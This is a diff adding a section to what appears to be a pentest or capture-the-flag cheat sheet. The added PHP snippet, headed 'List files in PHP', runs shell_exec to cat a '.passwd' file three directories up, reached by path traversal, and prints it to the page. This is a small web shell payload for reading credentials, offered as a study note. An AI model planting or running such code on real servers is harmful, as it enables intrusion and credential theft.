@@ -96,6 +96,15 @@ R-studio
 
 [Awesome websocket security](https://github.com/PalindromeLabs/awesome-websocket-security)
 
+#### List files in PHP
+
+```
+<?php
+	$output = shell_exec('cat ../../../.passwd');
+    echo "<pre>$output</pre>";
+?>
+```
+
 ### Script
 
 #### Privilege Escalation
